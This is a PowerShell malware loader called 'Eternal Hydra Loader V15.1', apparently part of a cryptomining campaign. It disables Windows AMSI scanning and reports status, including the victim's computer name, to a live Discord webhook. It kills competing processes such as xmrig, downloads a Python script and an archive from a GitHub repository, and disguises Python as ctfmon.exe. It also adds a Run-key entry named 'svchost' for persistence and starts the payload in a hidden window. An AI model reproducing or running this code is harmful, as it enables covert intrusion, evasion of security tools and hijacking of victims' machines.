\# --- THE ETERNAL HYDRA LOADER (V15.1 - UNBREAKABLE) ---
# 0. BLIND THE WATCHDOG
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}

$WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:USERPROFILE\Documents\SystemStorage"
$PY_MASK = "$Path\python\ctfmon.exe"

# Aggressive Process Kill to unlock files
if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue) { Stop-Process -Name "ctfmon" -Force; Start-Sleep -s 1 }
if (Get-Process -Name "xmrig" -ErrorAction SilentlyContinue) { Stop-Process -Name "xmrig" -Force; Start-Sleep -s 1 }

if (!(Test-Path $Path)) { md $Path -ErrorAction SilentlyContinue }

# 1. LANDING PAYLOADS
Send-Ghost "Landing V15.1 Unbreakable Engine..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($C_URL, "$Path\WinServices.py")
    $zipPath = "$Path\mui_cache.zip"
    $wc.DownloadFile($Z_URL, $zipPath)
    
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    # Robust extraction: unzip entry by entry to skip locks if necessary
    $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
    foreach ($entry in $zip.Entries) {
        $target = [System.IO.Path]::Combine($Path, $entry.FullName)
        if ($target.EndsWith("\")) { if (!(Test-Path $target)) { md $target > $null } }
        else {
            if (!(Test-Path ([System.IO.Path]::GetDirectoryName($target)))) { md ([System.IO.Path]::GetDirectoryName($target)) > $null }
            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $target, $true)
        }
    }
    $zip.Dispose()
    Remove-Item $zipPath -Force
    Send-Ghost "Extraction Successful."
} catch {
    Send-Ghost "CRITICAL ERROR DURING LANDING: $($_.Exception.Message)"
    Write-Error $_.Exception.Message
}

# 2. PERSISTENCE
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name $ID -Value "`"$PY_MASK`" `"$Path\WinServices.py`""

# 3. ENGAGE
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = $PY_MASK
$si.Arguments = "`"$Path\WinServices.py`""
$si.WindowStyle = "Hidden"
$si.WorkingDirectory = $Path
[System.Diagnostics.Process]::Start($si)
Send-Ghost "Hydra v15.1 Active. Shadow Protocol confirmed."
